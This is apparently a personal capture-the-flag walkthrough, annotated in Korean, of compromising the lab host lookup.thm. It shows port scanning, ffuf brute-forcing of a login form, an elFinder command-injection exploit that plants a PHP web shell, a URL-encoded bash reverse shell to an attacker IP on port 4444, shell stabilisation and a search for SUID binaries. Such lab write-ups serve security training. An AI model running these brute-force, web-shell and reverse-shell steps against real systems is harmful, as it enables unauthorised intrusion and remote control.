# 10.10.132.75

22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 d5:56:b3:f3:b2:00:86:2d:6d:15:3a:0e:71:7e:c4:8b (RSA)
| 256 7f:3b:7c:3c:91:bb:71:80:a6:8a:21:af:01:94:09:50 (ECDSA)
|\_ 256 3f:b9:54:e9:29:90:97:be:ec:fe:b2:d0:7e:90:c9:ce (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|\_http-title: Did not follow redirect to http://lookup.thm
|\_http-server-header: Apache/2.4.41 (Ubuntu)

searchsploit httpd 2.4

---

Exploit Title | Path

---

Apache 2.4.23 mod_http2 - Denial of Service | linux/dos/40909.py
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution | multiple/webapps/50383.sh
Omnicron OmniHTTPd 1.1/2.4 Pro - Remote Buffer Overflow | windows/remote/19566.c
OmniHTTPd 1.1/2.0.x/2.4 - 'test.php' Sample Application Cross-Site | windows/remote/21753.txt
OmniHTTPd 1.1/2.0.x/2.4 - Sample Application URL Encoded Newline H | windows/remote/21757.txt
OmniHTTPd 1.1/2.0.x/2.4 - test.shtml Sample Application Cross-Site | windows/remote/21754.txt
OpenBSD HTTPd < 6.0 - Memory Exhaustion Denial of Service | openbsd/dos/41278.txt

---

──(root㉿docker-desktop)-[/usr/share/exploitdb/exploits/windows/remote]

# cat 21753.txt

source: https://www.securityfocus.com/bid/5568/info

Cross site scripting vulnerabilities have been reported in multiple sample scripts including with OmniHTTPD. In particular, test.shtml and test.php contain errors.

This type of vulnerability may be used to steal cookies or perform other web-based attacks.

http://localhost/test.php?%3CSCRIPT%3Ealert%28document.URL%29%3C%2FSCRIPT%3E=x
┌──(root㉿docker-desktop)-[/usr/share/exploitdb/exploits/windows/remote]
└─#

# cat 21757.txt

source: https://www.securityfocus.com/bid/5572/info

OmniHTTPD is a webserver for Microsoft Windows operating systems. OmniHTTPD supports a number of CGI extensions which provide dynamic content.

A HTML injection vulnerability has been reported in the '/cgi-bin/redir.exe' sample CGI included with OmniHTTPD. Reportedly, it is possible for an attacker to URL encode the newline character (%0D) and insert malicious HTML code. A vulnerable server receiving a malformed request will return a 302 redirect HTTP response containing the malicious attacker-supplied code.

http://localhost/cgi-bin/redir.exe?URL=http%3A%2F%2Fwww%2Eyahoo%2Ecom%2F%0D%0A%0D%0A%3CSCRIPT%3Ealert%28document%2EURL%29%3C%2FSCRIPT%3E

curl -L "http://lookup.thm/cgi-bin/redir.exe?URL=http%3A%2F%2Fwww%2Eyahoo%2Ecom%2F%0D%0A%0D%0A%3C
SCRIPT%3Ealert%28document%2EURL%29%3C%2FSCRIPT%3E"

http://localhost/cgi-bin/redir.exe?URL=http://www.yahoo.com/

curl -L "http://lookup.thm/cgi-bin/redir.exe?URL=http://www.yahoo.com/"

<SCRIPT>alert(document.URL)</SCRIPT>

# cat 21754.txt

source: https://www.securityfocus.com/bid/5568/info

Cross site scripting vulnerabilities have been reported in multiple sample scripts including with OmniHTTPD. In particular, test.shtml and test.php contain errors.

This type of vulnerability may be used to steal cookies or perform other web-based attacks.

http://localhost/test.shtml?%3CSCRIPT%3Ealert(document.URL)%3C%2FSCRIPT%3E=x
curl -L "http://lookup.thm/test.shtml?%3CSCRIPT%3Ealert(document.URL)%3C%2FSCRIPT%3E=x"

# ffuf

ffuf -w xato-net-10-million-passwords-10000.txt -X POST -u http://lookup.thm/login.php -d 'userna
me=FUZZ&password=asdf' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -fs 74

- fw 10 : 응답 본문의 단어 수가 10이면 핕터링
- fs 74 : 응답 사이즈가 74는 필터링

┌──(root㉿codespaces-d5df79)-[/usr/share/seclists/Passwords/Common-Credentials]
└─# ffuf -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=a' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -w 10-million-password-list-top-100000.txt -fs 74 -of /ffuf-passwd.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : POST
:: URL : http://lookup.thm/login.php
:: Wordlist : FUZZ: /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt
:: Header : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
:: Data : username=FUZZ&password=a
:: Output file : /ffuf-passwd.txt
:: File format : json
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
:: Filter : Response size: 74

---

admin [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 192ms]
jose [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 194ms]

# found ids

admin, jose

# ffuf password

[/usr/share/seclists/Passwords/Common-Credentials]
└─# ffuf -u http://lookup.thm/login.php -X POST -d 'username=admin&password=FUZZ' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -w 10-million-password-list-top-1000000.txt -fs 62 -o /ffuf.login.passwd.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : POST
:: URL : http://lookup.thm/login.php
:: Wordlist : FUZZ: /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
:: Header : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
:: Data : username=admin&password=FUZZ
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
:: Filter : Response size: 62

---

password123 [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 191ms]

# login

curl -L -v -c cookies.txt -X POST http://lookup.thm/login.php -d 'username=jose&password=password123' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'

curl -L -c cookies.txt -X POST http://lookup.thm/login.php -d '{"username": "admin", {"password": "password123"}}' -H "Content-Type: application/json"

# login success

curl -L -v -c cookies.txt -X POST http://lookup.thm/login.php -d 'username=jose&password=password123' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'

Note: Unnecessary use of -X or --request, POST is already inferred.

- Host lookup.thm:80 was resolved.
- IPv6: (none)
- IPv4: 10.10.132.75
- Trying 10.10.132.75:80...
- Connected to lookup.thm (10.10.132.75) port 80
- using HTTP/1.x
  > POST /login.php HTTP/1.1
  > Host: lookup.thm
  > User-Agent: curl/8.14.1
  > Accept: _/_
  > Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  > Content-Length: 34
- upload completely sent off: 34 bytes
  < HTTP/1.1 302 Found
  < Date: Sat, 14 Jun 2025 05:08:03 GMT
  < Server: Apache/2.4.41 (Ubuntu)
- Added cookie login_status="success" for domain lookup.thm, path /, expire 1749881283
  < Set-Cookie: login_status=success; expires=Sat, 14-Jun-2025 06:08:03 GMT; Max-Age=3600; path=/; domain=lookup.thm
- Need to rewind upload for next request
  < Location: http://files.lookup.thm
  < Content-Length: 0
  < Content-Type: text/html; charset=UTF-8
- Ignoring the response-body
- setting size while ignoring
  <
- Connection #0 to host lookup.thm left intact
- Issue another request to this URL: 'http://files.lookup.thm/'
- Stick to POST instead of GET
- Could not resolve host: files.lookup.thm
- shutting down connection #1
  curl: (6) Could not resolve host: files.lookup.thm

# 응답 분석

> 내가 보내는 거
> < 서버에서 응답한 거

# 쿠키 확인

login_status="success"

# 에러 사유 분석

files.lookup.thm이 DNS에 등록되어 있지 않아서 에러 발생

echo "10.10.132.75 files.lookup.thm" | sudo tee -a /etc/hosts

# 다시 로그인 성공

──(root㉿docker-desktop)-[/]
└─# curl -L -v -c cookies.txt -X POST http://lookup.thm/login.php -d 'username=jose&password=password123' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -o output.html
Note: Unnecessary use of -X or --request, POST is already inferred.

- Host lookup.thm:80 was resolved.
- IPv6: (none)
- IPv4: 10.10.132.75
- Trying 10.10.132.75:80...
- Connected to lookup.thm (10.10.132.75) port 80
- using HTTP/1.x
  > POST /login.php HTTP/1.1
  > Host: lookup.thm
  > User-Agent: curl/8.14.1
  > Accept: _/_
  > Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  > Content-Length: 34
- upload completely sent off: 34 bytes
  < HTTP/1.1 302 Found
  < Date: Sat, 14 Jun 2025 05:18:38 GMT
  < Server: Apache/2.4.41 (Ubuntu)
- Added cookie login_status="success" for domain lookup.thm, path /, expire 1749881919
  < Set-Cookie: login_status=success; expires=Sat, 14-Jun-2025 06:18:38 GMT; Max-Age=3600; path=/; domain=lookup.thm
- Need to rewind upload for next request
  < Location: http://files.lookup.thm
  < Content-Length: 0
  < Content-Type: text/html; charset=UTF-8
- Ignoring the response-body
- setting size while ignoring
  <
- Connection #0 to host lookup.thm left intact
- Issue another request to this URL: 'http://files.lookup.thm/'
- Stick to POST instead of GET
- Host files.lookup.thm:80 was resolved.
- IPv6: (none)
- IPv4: 10.10.132.75
- Trying 10.10.132.75:80...
- Connected to files.lookup.thm (10.10.132.75) port 80
- using HTTP/1.x
  > POST / HTTP/1.1
  > Host: files.lookup.thm
  > User-Agent: curl/8.14.1
  > Accept: _/_
  > Cookie: login_status=success
  > Content-Type: application/x-www-form-urlencoded; charset=UTF-8
- Request completely sent off
  < HTTP/1.1 302 Found
  < Date: Sat, 14 Jun 2025 05:18:39 GMT
  < Server: Apache/2.4.41 (Ubuntu)
  < Location: http://files.lookup.thm/elFinder/elfinder.html
  < Content-Length: 0
  < Content-Type: text/html; charset=UTF-8
- Ignoring the response-body
- setting size while ignoring
  <
- Connection #1 to host files.lookup.thm left intact
- Issue another request to this URL: 'http://files.lookup.thm/elFinder/elfinder.html'
- Re-using existing http: connection with host files.lookup.thm
  > POST /elFinder/elfinder.html HTTP/1.1
  > Host: files.lookup.thm
  > User-Agent: curl/8.14.1
  > Accept: _/_
  > Cookie: login_status=success
  > Content-Type: application/x-www-form-urlencoded; charset=UTF-8
- Request completely sent off
  < HTTP/1.1 200 OK
  < Date: Sat, 14 Jun 2025 05:18:39 GMT
  < Server: Apache/2.4.41 (Ubuntu)
  < Last-Modified: Tue, 02 Apr 2024 12:30:57 GMT
  < ETag: "db3-6151c4722e240"
  < Accept-Ranges: bytes
  < Content-Length: 3507
  < Vary: Accept-Encoding
  < Content-Type: text/html
  <
  <!DOCTYPE html>
  <html>
          <head>
                  <meta charset="utf-8">
                  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
                  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
                  <title>elFinder</title>

                  <!-- Require JS (REQUIRED) -->
                  <!-- Rename "main.default.js" to "main.js" and edit it if you need configure elFInder options or any things -->
                  <script data-main="./main.default.js" src="//cdnjs.cloudflare.com/ajax/libs/require.js/2.3.5/require.min.js"></script>
                  <script>
                          define('elFinderConfig', {
                                  // elFinder options (REQUIRED)
                                  // Documentation for client options:
                                  // https://github.com/Studio-42/elFinder/wiki/Client-configuration-options
                                  defaultOpts : {
                                          url : 'php/connector.minimal.php' // connector URL (REQUIRED)
                                          ,commandsOptions : {
                                                  edit : {
                                                          extraOptions : {
                                                                  // set API key to enable Creative Cloud image editor
                                                                  // see https://console.adobe.io/
                                                                  creativeCloudApiKey : '',
                                                                  // browsing manager URL for CKEditor, TinyMCE
                                                                  // uses self location with the empty value
                                                                  managerUrl : ''
                                                          }
                                                  }
                                                  ,quicklook : {
                                                          // to enable CAD-Files and 3D-Models preview with sharecad.org
                                                          sharecadMimes : ['image/vnd.dwg', 'image/vnd.dxf', 'model/vnd.dwf', 'application/vnd.hp-hpgl', 'application/plt', 'application/step', 'model/iges', 'application/vnd.ms-pki.stl', 'application/sat', 'image/cgm', 'application/x-msmetafile'],
                                                          // to enable preview with Google Docs Viewer
                                                          googleDocsMimes : ['application/pdf', 'image/tiff', 'application/vnd.ms-office', 'application/msword', 'application/vnd.ms-word', 'application/vnd.ms-excel', 'application/vnd.ms-powerpoint', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'application/vnd.openxmlformats-officedocument.presentationml.presentation', 'application/postscript', 'application/rtf'],
                                                          // to enable preview with Microsoft Office Online Viewer
                                                          // these MIME types override "googleDocsMimes"
                                                          officeOnlineMimes : ['application/vnd.ms-office', 'application/msword', 'application/vnd.ms-word', 'application/vnd.ms-excel', 'application/vnd.ms-powerpoint', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'application/vnd.openxmlformats-officedocument.presentationml.presentation', 'application/vnd.oasis.opendocument.text', 'application/vnd.oasis.opendocument.spreadsheet', 'application/vnd.oasis.opendocument.presentation']
                                                  }
                                          }
                                          // bootCalback calls at before elFinder boot up
                                          ,bootCallback : function(fm, extraObj) {
                                                  /* any bind functions etc. */
                                                  fm.bind('init', function() {
                                                          // any your code
                                                  });
                                                  // for example set document.title dynamically.
                                                  var title = document.title;
                                                  fm.bind('open', function() {
                                                          var path = '',
                                                                  cwd  = fm.cwd();
                                                          if (cwd) {
                                                                  path = fm.path(cwd.hash) || null;
                                                          }
                                                          document.title = path? path + ':' + title : title;
                                                  }).bind('destroy', function() {
                                                          document.title = title;
                                                  });
                                          }
                                  },
                                  managers : {
                                          // 'DOM Element ID': { /* elFinder options of this DOM Element */ }
                                          'elfinder': {}
                                  }
                          });
                  </script>
          </head>
          <body>

                  <!-- Element where elFinder will be created (REQUIRED) -->
                  <div id="elfinder"></div>

          </body>

  </html>

- Connection #1 to host files.lookup.thm left intact

# 쿠키 설정 재요청

http --session=auth_session GET http://files.lookup.thm/ Cookie:"login_status=success"

# 쿠키 재사용

http --session=lookup_session POST http://lookup.thm/login.php username=jose password=password123

# exploitDB

──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
└─# searchsploit elfinder 2.
4------------------------------------------- ---------------------------------
Exploit Title | Path

---

elFinder 2 - Remote Command Execution (via | php/webapps/36925.py
elFinder 2.1.47 - 'PHP connector' Command | php/webapps/46481.py #
elFinder PHP Connector < 2.1.48 - 'exiftra | php/remote/46539.rb
elFinder PHP Connector < 2.1.48 - 'exiftra | php/remote/46539.rb
elFinder Web file manager Version - 2.1.53 | php/webapps/51864.txt

---

Shellcodes: No Results

┌──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
└─# ./46481.py
File "/usr/share/exploitdb/exploits/php/webapps/./46481.py", line 34
print "Usage: python exploit.py [URL]"
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?

# exploit

┌──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
└─# python2 ./46481.py http://files.lookup.thm/elFinder
[*] Uploading the malicious image...
[*] Running the payload...
[*] The site seems not to be vulnerable :(

┌──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
└─# python2 ./46481.py http://files.lookup.thm/elFinder/php/connector.minimal.php
[*] Uploading the malicious image...
[*] Running the payload...
[+] Pwned! :)
[+] Getting the shell...

# 연결이 된줄 알았으나 아니었음 touch SecSignal.jgp 빈 파일 이름만 jpg 로 생성 -> 실패 -> 진짜 jpg 가 아니여서 진짜 jpg 로 바꿔서 실행해봄

/home/kali/Downloads/360_F_143428338_gcxw3Jcd0tJpkvvb53pfEztwtU9sxsgT.jpg

┌──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
└─#

┌──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
└─#

┌──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
└─# cp /home/kali/Downloads/360_F_143428338_gcxw3Jcd0tJpkvvb53pfEztwtU9sxsgT.jpg SecSignal.jpg

┌──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
└─# python2 46481.py http://files.lookup.thm/elFinder/php/connector.minimal.php
[*] Uploading the malicious image...
[*] Running the payload...
[+] Pwned! :)
[+] Getting the shell...
$ ls
{"error":["errUnknownCmd"]}
$

# https://velog.io/@agnusdei1207/46481-CVE-2019-9194

# 진짜 jpg 로 바꾸고 실행하니 에러 -> 하지만 경로에 접근해보니 SecSignal.php 파일이 생성되어 있음

http://files.lookup.thm/elFinder/php

# cmd injection

http://files.lookup.thm/elFinder/php?c=ls

# 접속 URL:

```bash
# me
sudo apt install netcat-traditional
nc -lvnp 4444

# fail
curl http://files.lookup.thm/elFinder/php/SecSignal.php?c=/bin/sh -i >& /dev/tcp/10.8.136.212/4444 0>&1

# success
# bash
curl http://files.lookup.thm/elFinder/php/SecSignal.php?c=/bin/bash+-c+%22bash+-i+%3E%26+/dev/tcp/10.8.136.212/4444+0%3E%261%22

# URL 인코딩: /bin/bash+-c+
# 디코딩: /bin/bash -c
# 설명: bash로 명령을 실행하되, -c 옵션을 줘서 문자열 형태의 명령어를 실행하겠다는 의미
# URL 인코딩: %22
# 디코딩: "
# 설명: 큰따옴표로 명령어 문자열을 감싸기 위한 것. bash -c 뒤에 실행할 전체 명령을 묶기 위해 사용됨
# URL 인코딩: bash+-i+
# 디코딩: bash -i
# 설명: bash를 인터랙티브 모드로 실행. 대화형 셸을 열기 위한 핵심 옵션
# URL 인코딩: %3E%26
# 디코딩: >&
# 설명: 표준 출력(stdout)을 리디렉션해서 다른 곳으로 보냄. 여기선 TCP 연결로 출력 보내는 것
# URL 인코딩: +/dev/tcp/10.8.136.212/4444+
# 디코딩: /dev/tcp/10.8.136.212/4444
# 설명: bash에서 지원하는 특수 파일 경로. 여기에 연결하면 TCP 연결이 생김 (공격자 리스너와 연결됨)
# URL 인코딩: 0%3E%261
# 디코딩: 0>&1
# 설명: 표준 입력(stdin)을 표준 출력(stdout)으로 리디렉션. 이렇게 하면 입력도 공격자 쪽으로 전달됨
# URL 인코딩: %22
# 디코딩: "
# 설명: 명령어 문자열 끝을 닫는 큰따옴표. bash -c 명령어를 완성함
```

# tty 획득

```bash
control + z
# 로컬: 현재의 리버스쉘을 백그라운드 실행

stty raw -echo
# stty : 터미널 속성 제어 명령어
# raw : 키 입력을 가공하지 않고 있는 그대로(원시 상태) 터미널로 전달
#         → Ctrl+C, Ctrl+Z 등 특수키도 바로 쉘로 전달됨
# -echo : 입력한 키가 화면에 표시되지 않도록 끔
#         → 쉘이 제대로 입력받을 수 있도록 키 입력 출력 억제

fg
# 백그라운드(중단)된 프로세스를 포그라운드로 불러옴
# 쉘을 일시 중단(Ctrl+Z)한 뒤 다시 활성화하는 명령어


export TERM=xterm
# TERM 환경 변수 설정
# xterm은 일반적인 터미널 타입으로, 방향키 등 키보드 제어 정상 작동을 도와줌
# 올바른 터미널 타입 설정으로 쉘 내 키보드 입력 문제 해결

reset
# 터미널 초기화 명령어
# 터미널 화면이 깨지거나 이상해졌을 때 원래 상태로 복구
# 키 입력이나 화면 출력 문제 해결에 도움


```

# file /usr/sbin/pwm

www-data@ip-10-10-248-63:/home/think$ file /usr/sbin/pwm
/usr/sbin/pwm: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=01ec8570b00af8889beebc5f93c6d56fb9cc1083, for GNU/Linux 3.2.0, not stripped

# /usr/sbin/pwm

data@ip-10-10-67-138:/usr/bin$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found

# strings /usr/sbin/pwm | less

문자열 정보 추출

# ldd /usr/sbin/pwm

동적 라이브러리 의존성 확인

# strace /usr/sbin/pwm 2>&1 | grep -i -E "open|access|read"

바이너리 분석

# python3 -c 'import pty; pty.spawn("/bin/bash")'

pty 업그레이드

# find / -perm -4000 -type f 2>/dev/null

ww-data@ip-10-10-67-138:/$ find / -perm -4000 -type f 2>/dev/null
/snap/snapd/19457/usr/lib/snapd/snap-confine
/snap/core20/1950/usr/bin/chfn
/snap/core20/1950/usr/bin/chsh
/snap/core20/1950/usr/bin/gpasswd
/snap/core20/1950/usr/bin/mount
/snap/core20/1950/usr/bin/newgrp
/snap/core20/1950/usr/bin/passwd
/snap/core20/1950/usr/bin/su
/snap/core20/1950/usr/bin/sudo
/snap/core20/1950/usr/bin/umount
/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1950/usr/lib/openssh/ssh-keysign
/snap/core20/1974/usr/bin/chfn
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount
/snap/core20/1974/usr/bin/newgrp
/snap/core20/1974/usr/bin/passwd
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo
/snap/core20/1974/usr/bin/umount
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pwm
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
